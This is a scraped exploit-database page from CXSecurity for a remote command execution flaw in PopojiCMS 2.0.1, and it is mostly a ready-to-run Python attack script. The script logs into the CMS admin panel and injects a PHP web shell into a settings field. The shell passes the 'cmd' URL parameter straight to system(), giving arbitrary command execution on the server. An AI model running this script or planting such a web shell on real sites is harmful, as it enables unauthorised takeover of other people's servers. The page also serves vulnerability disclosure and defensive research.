---
title: PopojiCMS 2.0.1 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2024050055
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-21
fetch_date: 2025-10-06T16:49:00.660207
---

# PopojiCMS 2.0.1 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PopojiCMS 2.0.1 Remote Command Execution** **2024.05.20**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: PopojiCMS 2.0.1 - Remote Command Execution
# Date: 14/04/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.popojicms.org/
# Software Link:
https://github.com/PopojiCMS/PopojiCMS/archive/refs/tags/v2.0.1.zip
# Version: Version : 2.0.1
# Tested on: https://www.softaculous.com/apps/cms/PopojiCMS
import requests
import time
import sys
def exploit(url, username, password):
login\_url = f"{url}/po-admin/route.php?mod=login&act=proclogin"
login\_data = {"username": username, "password": password}
headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": f
"{url}/po-admin/index.php"}
session = requests.Session()
login\_response = session.post(login\_url, data=login\_data, headers=headers)
if "Administrator PopojiCMS" in login\_response.text:
print("Login Successful!")
time.sleep(1) # 1 saniye bekle
else:
print("Login Failed!")
return
edit\_url = f"{url}/po-admin/route.php?mod=setting&act=metasocial"
edit\_data = {"meta\_content": """<html>
<body>
<form method="GET" name="<?php echo basename($\_SERVER['PHP\_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($\_GET['cmd']))
{
system($\_GET['cmd']);
}
?>
</pre>
</body>
</html>"""}
edit\_response = session.post(edit\_url, data=edit\_data, headers=headers)
if "cmd" in edit\_response.text:
print("Your shell is ready:", url)
time.sleep(1)
else:
print("Exploit Failed!")
return
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 4:
print("Kullanım: python exploit.py sitename username password")
sys.exit(1)
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
print("Exploiting...")
time.sleep(1)
print("Logging in...")
time.sleep(1)
exploit(url, username, password)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050055)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top